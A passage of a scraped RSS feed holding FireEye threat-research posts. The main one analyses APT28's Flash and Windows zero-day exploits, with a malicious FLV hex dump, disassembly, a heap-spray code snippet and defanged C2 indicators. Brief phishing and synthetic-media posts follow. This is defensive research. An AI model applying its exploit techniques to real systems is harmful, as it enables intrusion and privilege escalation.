href=\"https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/view#gid=1123292625\"><i>Google Project Zero's zero-day \"In the Wild\" Spreadsheet</i></a> <i>. While we believe these sources are reliable as used in this paper, we do not vouch for the complete findings of those sources. Due to the ongoing discovery of past incidents, we expect that this research will remain dynamic.</i></p>","descriptionType":"html","publishedDate":"Mon, 06 Apr 2020 12:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/intelvuln1/Picture1.png","linkMd5":"3fa0d2964c03324131614f6219961b28","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn13@2020_3/2020/08/24/14-11-05-357_fb98863355754816.webp","destWidth":974,"destHeight":608,"sourceBytes":414168,"destBytes":63308,"author":"Kathleen Metrick","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/intelvuln1/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn13@2020_3/2020/08/24/14-11-05-357_fb98863355754816.webp"},"publishedOrCreatedDate":1598278264183},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Operation RussianDoll: Adobe &amp; Windows Zero-Day Exploits Likely\nLeveraged by Russia’s APT28 in Highly-Targeted Attack","link":"http://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html","description":"<p>FireEye Labs recently detected a limited APT campaign exploiting zero-day vulnerabilities in Adobe Flash and a brand-new one in Microsoft Windows. Using the <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html\" target=\"_self\">Dynamic Threat Intelligence Cloud (DTI)</a>, FireEye researchers detected a pattern of attacks beginning on April 13<sup>th<a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html\"></a></sup>, 2015. Adobe independently patched the vulnerability (CVE-2015-3043) in <a href=\"https://helpx.adobe.com/security/products/flash-player/apsb15-06.html\">APSB15-06</a>. Through correlation of technical indicators and command and control infrastructure, FireEye assess that APT28 is probably responsible for this activity.</p> \n<p>Microsoft is aware of the outstanding local privilege escalation vulnerability in Windows (CVE-2015-1701). While there is not yet a patch available for the Windows vulnerability, updating Adobe Flash to the latest version will render this in-the-wild exploit innocuous. We have only seen CVE-2015-1701 in use in conjunction with the Adobe Flash exploit for CVE-2015-3043. The Microsoft Security Team is working on a fix for CVE-2015-1701.</p> \n<h2>Exploit Overview</h2> \n<p>The high level flow of the exploit is as follows:</p> \n<p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; User clicks link to attacker controlled website<br /> 2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HTML/JS launcher page serves Flash exploit<br /> 3.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Flash exploit triggers CVE-2015-3043, executes shellcode<br /> 4.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Shellcode downloads and runs executable payload<br /> 5.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Executable payload exploits local privilege escalation (CVE-2015-1701) to steal System token</p> \n<p>The Flash exploit is served from unobfuscated HTML/JS. The launcher page picks one of two Flash files to deliver depending upon the target’s platform (Windows 32 versus 64bits).</p> \n<p>The Flash exploit is mostly unobfuscated with only some light variable name mangling. The attackers relied heavily on the CVE-2014-0515 Metasploit module, which is well documented. It is ROPless, and instead constructs a fake vtable for a FileReference object that is modified for each call to a Windows API.</p> \n<p>The payload exploits a local privilege escalation vulnerability in the Windows kernel if it detects that it is running with limited privileges. It uses the vulnerability to run code from userspace in the context of the kernel, which modifies the attacker’s process token to have the same privileges as that of the System process.</p> \n<h2>CVE-2015-3043 Exploit</h2> \n<p>The primary difference between the CVE-2014-0515 metasploit module and this exploit is, obviously, the vulnerability. CVE-2014-0515 exploits a vulnerability in Flash’s Shader processing, whereas CVE-2015-3043 exploits a vulnerability in Flash’s FLV processing. The culprit FLV file is embedded within AS3 in two chunks, and is reassembled at runtime.</p> \n<h3>Vulnerability</h3> \n<p>A buffer overflow vulnerability exists in Adobe Flash Player (&lt;=17.0.0.134) when parsing malformed FLV objects. Attackers exploiting the vulnerability can corrupt memory and gain remote code execution.</p> \n<p>In the exploit, the attacker embeds the FLV object directly in the ActionScript code, and plays the video using NetStream class. In memory, it looks like the following:</p> \n<p>0000000: 46 4c 56 01 05 00 00 00 09 00 00 00 00 12 00 00&nbsp; FLV.............<br /> 0000010: f4 00 00 00 00 00 00 00 02 00 0a 6f 6e 4d 65 74&nbsp; ...........onMet<br /> 0000020: 61 44 61 74 61 08 00 00 00 0b 00 08 64 75 72 61&nbsp; aData.......dura<br /> 0000030: 74 69 6f 6e 00 40 47 ca 3d 70 a3 d7 0a 00 05 77&nbsp; tion.@G.=p.....w<br /> 0000040: 69 64 74 68 00 40 74 00 00 00 00 00 00 00 06 68&nbsp; idth.@t........h<br /> 0000050: 65 69 67 68 74 00 40 6e 00 00 00 00 00 00 00 0d&nbsp; eight.@n........<br /> 0000060: 76 69 64 65 6f 64 61 74 61 72 61 74 65 00 00 00&nbsp; videodatarate...<br /> …..<br /> 0003b20: 27 6e ee 72 87 1b 47 f7 41 a0 00 00 00 3a 1b 08&nbsp; 'n.r..G.A....:..<br /> 0003b30: 00 04 41 00 00 0f 00 00 00 00 68 ee ee ee ee ee&nbsp; ..A.......h.....<br /> 0003b40: ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee&nbsp; ................<br /> 0003b50: ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee&nbsp; ................<br /> 0003b60: ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee ee&nbsp; ................<br /> </p> \n<p>Files of the FLV file format contain a sequence of Tag structures. In Flash, these objects are created when parsing FLV Tags:</p> \n<p>.text:1018ACE9 sub_1018ACE9&nbsp;&nbsp;&nbsp; proc near&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; CODE XREF: sub_1018BBAC+2Bp<br /> .text:1018ACE9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; sub_10192797+1A1p ...<br /> .text:1018ACE9<br /> .text:1018ACE9 arg_0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = dword ptr&nbsp; 4<br /> .text:1018ACE9<br /> .text:1018ACE9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp; eax, ecx<br /> .text:1018ACEB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ecx, [esp+arg_0]<br /> .text:1018ACEF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; dword ptr [eax], offset off_10BA771C<br /> .text:1018ACF5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; dword ptr [eax+24h], 1<br /> .text:1018ACFC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp;&nbsp; dword ptr [eax+14h], 0<br /> .text:1018AD00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; [eax+28h], ecx<br /> .text:1018AD03&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; byte ptr [eax+20h], 0<br /> .text:1018AD07&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; retn&nbsp;&nbsp;&nbsp; 4<br /> .text:1018AD07 sub_1018ACE9&nbsp;&nbsp;&nbsp; endp<br /> </p> \n<p>In the case of this exploit, a Tag structure begins at offset 0x3b2f into the FLV stream that, when parsed, populates the Tag structure as follows:</p> \n<p>Tag 2:<br /> UINT_8 type: 8<br /> UINT_24 datasize: 1089<br /> UINT_24 timestamp: 15<br /> UINT_8 timestamphi: 0<br /> UINT_24 streamid: 0<br /> UINT_4 fmt: 6<br /> UINT_2 sr: 2<br /> UINT_1 bits: 0<br /> UINT_1 channels: 0<br /> UBYTE data[1088]: \\xee\\xee\\xee\\xee…<br /> UINT_32 lastsize: 0xeeeeeeee<br /> </p> \n<p>Beginning within the data field, all contents of the FLV stream become 0xEE. Consequently, the data and lastsize fields are mangled, and one final tag technically exists consisting exclusively of 0xEE:</p> \n<p>Tag 3:<br /> UINT_8 type: 0xEE<br /> UINT_24 datasize: 0xEEEEEE<br /> …<br /> </p> \n<p>One can see the datasize field of Tag2 populated from the attacker's FLV stream below:</p> \n<p> <br /> .text:10192943&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; eax, [ebx+24h]<br /> .text:10192946&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; [esi+14h], eax<br /> .text:10192949&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movzx&nbsp;&nbsp; eax, byte ptr [ebx+19h] ; 00<br /> .text:1019294D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movzx&nbsp;&nbsp; ecx, byte ptr [ebx+1Ah] ; 04<br /> .text:10192951&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; shl&nbsp;&nbsp;&nbsp;&nbsp; eax, 8<br /> .text:10192954&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; or&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, ecx<br /> .text:10192956&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movzx&nbsp;&nbsp; ecx, byte ptr [ebx+1Bh] ; 41<br /> .text:1019295A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; shl&nbsp;&nbsp;&nbsp;&nbsp; eax, 8<br /> .text:1019295D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; or&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, ecx<br /> .text:1019295F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ecx, ebx<br /> .text:10192961&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; [esi+0Ch], eax&nbsp; ; 0x441<br /> .text:10192964&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp; sub_1002E2B3<br /> </p> \n<p>The buffer is allocated with fixed size 0x2000:</p> \n<p>.text:101A647E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; 2000h<br /> .text:101A6483&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; &nbsp;ecx, esi<br /> .text:101A6485&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp; sub_101A6257&nbsp;&nbsp;&nbsp; ; alloc 0x2000 buffer, store in esi+0xDC<br /> ……<br /> .text:101A627F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; 0<br /> .text:101A6281&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; 0x2000<br /> .text:101A6282&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp; sub_105EBEB0<br /> .text:101A6287&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp; ecx<br /> .text:101A6288&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp; ecx<br /> .text:101A6289&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; [esi+0DCh], eax</p> \n<p>Since the size is controlled by the attacker, it’s possible to overflow the fixed size buffer with certain data.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Probable%20APT28/figure-1.png\" /></p> \n<p>A datasize of 0x441 results in a value here of 0x1100 passed to sub_100F88F8, which memcopies 0x2200 bytes in 0x11 chunks of 0x200. The last memcpy overflows the fixed size 0x2000 buffer into a adjacent heap memory.</p> \n<p>Attackers spray the heap with array of Vector, 0x7fe * 4 + 8 == 0x2000, and create holes of such size, which will be allocated by the said object.</p> \n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while (_local_2 &lt; this._bp35) // _bp35 == 0x2000<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this._ok47[_local_2] = new Vector.&lt;uint&gt;(this._lb60); // _lb60 == 0x07FE<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _local_3 = 0x00;<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while (_local_3 &lt; this._lb60)<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this._ok47[_local_2][_local_3] = 0x41414141;<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _local_3++;<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _local_2 = (_local_2 + 0x01);<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _local_2 = 0x00;<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while (_local_2 &lt; this._bp35)<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this._ok47[_local_2] = null;<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _local_2 = (_local_2 + 0x02);<br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Probable%20APT28/figure-2.JPG\" /></p> \n<p>As the previous picture demonstrated, the followed Vector object’s length field being overflowed as 0x80007fff, which enables the attacker to read/write arbitrary data within user space.</p> \n<h2>Shellcode</h2> \n<p>Shellcode is passed to the exploit from HTML in flashvars. The shellcode downloads the next stage payload, which is an executable passed in plaintext, to the temp directory with UrlDownloadToFileA, which it then runs with WinExec.</p> \n<h2>Payload &amp; C2</h2> \n<p>This exploit delivers a malware variant that shares characteristics with the APT28 backdoors CHOPSTICK and CORESHELL malware families, both described in our APT28 <a href=\"https://www2.fireeye.com/apt28.html\">whitepaper</a>.&nbsp; The malware uses an RC4 encryption key that was previously used by the CHOPSTICK backdoor.&nbsp; And the C2 messages include a checksum algorithm that resembles those used in CHOPSTICK backdoor communications.&nbsp; In addition, the network beacon traffic for the new malware resembles those used by the CORESHELL backdoor.&nbsp; Like CORESHELL, one of the beacons includes a process listing from the victim host.&nbsp; And like CORESHELL, the new malware attempts to download a second-stage executable.</p> \n<p>One of the C2 locations for the new payload, <span style=\"font-family: Courier New;\">87.236.215[.]246</span>, also hosts a suspected APT28 domain <span style=\"font-family: Courier New;\">ssl-icloud[.]com</span>.&nbsp; The same subnet (<span style=\"font-family: Courier New;\">87.236.215.0/24</span>) also hosts several known or suspected APT28 domains, as seen in Table 1.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Probable%20APT28/table.PNG\" /></p> \n<p>The target firm is an international government entity in an industry vertical that aligns with known APT28 targeting.</p> \n<h2>CVE-2015-1701 Exploit</h2> \n<p>The payload contains an exploit for the unpatched local privilege escalation vulnerability CVE-2015-1701 in Microsoft Windows. The exploit uses CVE-2015-1701 to execute a callback in userspace. The callback gets the EPROCESS structures of the current process and the System process, and copies data from the System token into the token of the current process. Upon completion, the payload continues execution in usermode with the privileges of the System process.</p> \n<p>Because CVE-2015-3043 is already patched, this remote exploit will not succeed on a fully patched system. If an attacker wanted to exploit CVE-2015-1701, they would first have to be executing code on the victim’s machine. Barring authorized access to the victim’s machine, the attacker would have to find some other means, such as crafting a new Flash exploit, to deliver a CVE-2015-1701 payload.</p> \n<p>Microsoft is aware of CVE-2015-1701 and is working on a fix. CVE-2015-1701 does not affect Windows 8 and later.</p> \n<h1>Acknowledgements</h1> \n<p>Thank you to all of the contributors to this blog!</p> \n<ul class=\"list-bullet\"> \n <li>The following people in FireEye: Dan Caselden, Yasir Khalid, James “Tom” Bennett, GenWei Jiang, Corbin Souffrant, Joshua Homan, Jonathan Wrolstad, Chris Phillips, Darien Kindlund</li> \n <li>Microsoft &amp; Adobe security teams</li> \n</ul> \n<p>&nbsp;</p>","descriptionType":"html","publishedDate":"Sat, 18 Apr 2015 16:10:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Probable%20APT28/figure-1.png","linkMd5":"fddeed9b0703e7f6f52cf35a37065473","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn100@2020_4/2020/08/24/14-11-05-314_7d4fc49b3ad6126f.webp","destWidth":485,"destHeight":591,"sourceBytes":185801,"destBytes":60448,"author":"Fireeye Labs","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Probable%20APT28/figure-1.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn100@2020_4/2020/08/24/14-11-05-314_7d4fc49b3ad6126f.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Probable%20APT28/figure-2.JPG":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Probable%20APT28/table.PNG":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg"},"publishedOrCreatedDate":1598278264199},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Repurposing Neural Networks to Generate Synthetic Media for Information Operations","link":"http://www.fireeye.com/blog/threat-research/2020/08/repurposing-neural-networks-to-generate-synthetic-media-for-information-operations.html","description":"<p>FireEye’s Data Science and Information Operations Analysis teams\n  released this blog post <a\n    href=\"https://www.blackhat.com/us-20/briefings/schedule/#repurposing-neural-networks-to-generate-synthetic-media-for-information-operations-19529\">to\n    coincide with our Black Hat USA 2020 Briefing</a>, which details how\n  open source, pre-trained neural networks can be leveraged to generate\n  synthetic media for malicious purposes. To summarize our presentation,\n  we first demonstrate three successive proof of concepts for how\n  machine learning models can be fine-tuned in order to generate\n  customizable synthetic media in the text, image, and audio domains.\n  Next, we illustrate examples in which synthetically generated media\n  have been weaponized for information operations (IO), as detected on\n  the front lines by Mandiant Threat Intelligence. Finally, we outline\n  challenges in detecting synthetically generated content, and lay out\n  potential paths forward in a future where synthetically generated\n  media will increasingly look, speak, and write like us.</p>\n <table border=\"1\" cellspacing=\"0\" cellpadding=\"0\" width=\"90%\"\n  style=\"margin: 0 auto 20.0px;\"> <tbody>\n    <tr>\n      <td width=\"100%\" valign=\"top\"><p>\n          <i>Highlights</i></p> <ul> <li>Open source, pre-trained\n            natural language processing, computer vision, and speech\n            recognition neural networks can be weaponized for offensive\n            social media-driven IO campaigns.</li> <li>Detection,\n            attribution, and response is challenging in scenarios where\n            actors can anonymously generate and distribute credible fake\n            content using proprietary training datasets.</li> <li>The\n            security community can and should help AI researchers,\n            policy makers, and other stakeholders mitigate the harmful\n            use of open source models.</li> </ul> </td> </tr></tbody></table>\n <h4>Background: Synthetic Media, Generative Models, and Transfer Learning</h4>\n <p>Synthetic media is by no means a new development; methods for\n  manipulating media for specific agendas are as old as the media\n  themselves. In the 1930’s, the chief of the Soviet secret police was\n  photographed walking alongside Joseph Stalin before being retouched\n  out of an official press photo, <a\n    href=\"https://en.wikipedia.org/wiki/Censorship_of_images_in_the_Soviet_Union\">after\n    he <i>himself </i>was arrested and executed during the Great\n  Purge</a>. Digital graphic manipulation like this became prominent\n  with the advent of Photoshop. Then later in the 2010’s, the term\n  “deepfake” was coined. While deepfake videos, including techniques\n  like face swapping and lip syncing, are concerning in the long term,\n  this blog post focuses on more basic, but we argue more believable,\n  synthetic media generation advancements in the text, static image, and\n  audio domains. Machine learning approaches for creating synthetic\n  media are underpinned by generative models, which have been\n  effectively misused <a href=\"https://techscience.org/a/2019121801/\">to\n    fabricate high volume submissions to federal public comment\n  websites</a> and <a\n    href=\"https://www.forbes.com/sites/jessedamiani/2019/09/03/a-voice-deepfake-was-used-to-scam-a-ceo-out-of-243000/#49bb4bd82241\">clone\n    a voice to trick an executive into handing over $240,000</a>.</p>\n <p>The pre-training required to produce models capable of synthetic\n  media generation can cost thousands of dollars, take weeks or months\n  of time, and require access to expensive GPU clusters. However, the\n  application of <a\n    href=\"https://en.wikipedia.org/wiki/Transfer_learning\">transfer\n  learning</a> can drastically reduce the amount of time and effort\n  involved. In transfer learning, we start from a large generic model\n  that has been pre-trained for an initial task where copious data is\n  available. We then leverage the model’s acquired knowledge to train it\n  further on a different, smaller dataset so that it excels at a\n  subsequent, related task. This process of training the model further\n  is referred to as <i>fine-tuning</i>, which typically requires less\n  resources compared to pre-training from scratch. You can think of this\n  in more relatable terms—if you’re a professional tennis player, you\n  don’t need to completely relearn how to swing a racket in order to\n  excel at badminton.</p>\n","descriptionType":"html","publishedDate":"Wed, 05 Aug 2020 18:00:00 +0000","feedId":1226,"bgimg":"","linkMd5":"61b1c01663a50d29541522b322e26c01","bgimgJsdelivr":"","metaImg":"","author":"Philip Tully","publishedOrCreatedDate":1598278264182},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"‘One-Stop Shop’ – Phishing Domain Targets Information from Customers of\nSeveral Indian Banks","link":"http://www.fireeye.com/blog/threat-research/2016/11/one-stop-shop-phishing-domain.html","description":"<p>FireEye Labs recently discovered a malicious phishing domain designed to steal a variety of information – including credentials and mobile numbers – from customers of several banks in India. Currently, we have not observed this domain being used in any campaigns. The phishing websites appear to be in the earlier stages of development and through this post we hope users will be able to identify these types of emerging threats in the future.</p> \n<p>FireEye <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/email-security.html\">phishing detection technology</a> identified a newly registered domain, “csecurepay[.]com”, that was registered on Oct. 23, 2016. The website purports to offer online payment gateway services, but is actually a phishing website that leads to the capturing of victim logon credentials – and other information – for multiple banks operating in India.</p> \n<p>Prior to publication, FireEye notified the Indian Computer Emergency Response Team.</p> \n<h3>Phishing Template Presentation and Techniques</h3> \n<h4>Step 1</h4> \n<p>URL: hxxp://csecurepay[.]com/load-cash-step2.aspx</p> \n<p>When navigating to the URL, the domain appears to be a payment gateway and requests that the user enter their bank account number and the amount to be transferred, as seen in Figure 1. The victim is allowed to choose their bank from a list that is provided.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig1.png\" /></p> \n<p> <span class=\"type-XS\">Figure 1: Bank information being requested</span></p> \n<p>By looking at the list, it is clear that only Indian banks are being targeted at this time. A total of 26 banks are available and these are named in the Appendix.</p> \n<h4>Step 2</h4> \n<p>URL:&nbsp; hxxp://csecurepay[.]com/PaymentConfirmation.aspx</p> \n<p>The next website requests the victim to enter their valid 10-digit mobile number and email ID (Figure 2), which makes the website appear more legitimate.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig2.png\" /></p> \n<p> <span class=\"type-XS\">Figure 2: Personal information being requested</span></p> \n<h4>Step 3</h4> \n<p>The victim will then be redirected to the spoofed online banking page of the 